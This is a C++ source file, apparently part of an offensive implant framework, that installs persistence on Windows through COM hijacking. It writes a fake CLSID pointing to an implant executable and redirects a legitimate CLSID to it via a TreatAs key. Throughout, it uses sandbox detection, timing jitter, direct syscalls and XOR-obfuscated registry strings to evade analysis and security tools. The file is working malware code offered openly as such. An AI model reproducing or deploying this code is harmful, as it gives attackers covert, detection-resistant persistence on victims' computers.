#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../evasion/AntiSandbox.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <vector>
#include <sstream>
#include <thread>
#include <chrono>

namespace persistence {

bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& victimClsid) {
    LOG_DEBUG("ComHijacker::Install (TreatAs mode) started");

    // 1. Anti-Analysis
    if (evasion::IsLikelySandbox()) {
        LOG_WARN("Sandbox detected. Aborting persistence.");
        return false;
    }

    // 2. Jitter
    int jitter = (rand() % 5000) + 2000; // 2-7 seconds
    std::this_thread::sleep_for(std::chrono::milliseconds(jitter));

    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) {
        LOG_ERR("Failed to get current user SID");
        return false;
    }

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) {
        LOG_ERR("Failed to resolve syscalls for ComHijacker");
        return false;
    }

    // Our fake CLSID that points to implant
    // {D062E522-8302-4A73-A337-02A7E1337424} - randomly chosen
    std::wstring ourClsid = L"{D062E522-8302-4A73-A337-02A7E1337424}";

    // Open HKCU root (NT path: \Registry\User\<SID>)
    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    if (!NT_SUCCESS(status)) {
        LOG_ERR("Failed to open HKCU root: 0x" + utils::Shared::ToHex((unsigned int)status));
        return false;
    }

    // A. Create our own fake CLSID -> LocalServer32 = implantPath
    // We use LocalServer32 because we are an EXE.
    // "Software\\Classes\\CLSID\\"
    std::wstring clsBase = utils::xor_wstr(L"\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x19\x36\x3b\x29\x29\x3f\x29\x00\x19\x16\x03\x13\x1e\x00", 23);
    // "LocalServer32"
    std::wstring locSrv = utils::xor_wstr(L"\x16\x35\x39\x3b\x36\x09\x3f\x28\x2c\x3f\x28\x69\x68", 13);

    std::wstring ourRelativePath = clsBase + ourClsid + L"\\" + locSrv;
    HANDLE hOurKey = NULL;
    status = utils::Shared::NtCreateKeyRelative(hHkcu, ourRelativePath, &hOurKey);

    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hOurKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hOurKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else {
        LOG_ERR("Failed to create fake CLSID key: 0x" + utils::Shared::ToHex((unsigned int)status));
        InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        return false;
    }

    // B. Hijack legitimate victim CLSID via TreatAs -> points to our fake CLSID
    // "TreatAs"
    std::wstring treatAs = utils::xor_wstr(L"\x0e\x28\x3f\x3b\x2e\x1b\x29", 7);
    std::wstring treatAsRelativePath = clsBase + victimClsid + L"\\" + treatAs;
    HANDLE hTreatAsKey = NULL;
    status = utils::Shared::NtCreateKeyRelative(hHkcu, treatAsRelativePath, &hTreatAsKey);

    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hTreatAsKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)ourClsid.c_str(), (PVOID)(UINT_PTR)((ourClsid.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hTreatAsKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        LOG_INFO("TreatAs hijack installed: " + utils::ws2s(victimClsid) + " -> " + utils::ws2s(ourClsid));
    } else {
        LOG_ERR("Failed to create TreatAs key: 0x" + utils::Shared::ToHex((unsigned int)status));
    }

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return NT_SUCCESS(status);
}

bool ComHijacker::Uninstall(const std::wstring& victimClsid) {
    LOG_DEBUG("ComHijacker::Uninstall started");
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    // Fake CLSID needs to be matched
    std::wstring ourClsid = L"{D062E522-8302-4A73-A337-02A7E1337424}";

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) return false;

    // 1. Delete TreatAs for victim
    std::wstring clsBase = utils::xor_wstr(L"\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x19\x36\x3b\x29\x29\x3f\x29\x00\x19\x16\x03\x13\x1e\x00", 23);
    std::wstring treatAs = utils::xor_wstr(L"\x0e\x28\x3f\x3b\x2e\x1b\x29", 7);

    std::wstring victimPath = clsBase + victimClsid + L"\\" + treatAs;
    UNICODE_STRING uVictim;
    uVictim.Buffer = (PWSTR)victimPath.c_str();
    uVictim.Length = (USHORT)(victimPath.length() * sizeof(wchar_t));
    uVictim.MaximumLength = uVictim.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES victimAttr;
    InitializeObjectAttributes(&victimAttr, &uVictim, OBJ_CASE_INSENSITIVE, hHkcu, NULL);
    HANDLE hVictimKey = NULL;
    if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hVictimKey, (PVOID)(UINT_PTR)DELETE, &victimAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
        InternalDoSyscall(ntDeleteKeySsn, hVictimKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hVictimKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }

    // 2. Delete our fake CLSID
    std::wstring ourPath = clsBase + ourClsid;
    // Note: Recursive delete would be needed if there are subkeys like LocalServer32.
    // For simplicity, we delete LocalServer32 first.
    std::wstring locSrv = utils::xor_wstr(L"\x16\x35\x39\x3b\x36\x09\x3f\x28\x2c\x3f\x28\x69\x68", 13);
    std::wstring ourServerPath = ourPath + L"\\" + locSrv;
    UNICODE_STRING uOurServer;
    uOurServer.Buffer = (PWSTR)ourServerPath.c_str();
    uOurServer.Length = (USHORT)(ourServerPath.length() * sizeof(wchar_t));
    uOurServer.MaximumLength = uOurServer.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES ourServerAttr;
    InitializeObjectAttributes(&ourServerAttr, &uOurServer, OBJ_CASE_INSENSITIVE, hHkcu, NULL);
    HANDLE hOurServerKey = NULL;
    if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hOurServerKey, (PVOID)(UINT_PTR)DELETE, &ourServerAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
        InternalDoSyscall(ntDeleteKeySsn, hOurServerKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hOurServerKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }

    UNICODE_STRING uOur;
    uOur.Buffer = (PWSTR)ourPath.c_str();
    uOur.Length = (USHORT)(ourPath.length() * sizeof(wchar_t));
    uOur.MaximumLength = uOur.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES ourAttr;
    InitializeObjectAttributes(&ourAttr, &uOur, OBJ_CASE_INSENSITIVE, hHkcu, NULL);
    HANDLE hOurKey = NULL;
    if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hOurKey, (PVOID)(UINT_PTR)DELETE, &ourAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
        InternalDoSyscall(ntDeleteKeySsn, hOurKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hOurKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return true;
}

} // namespace persistence
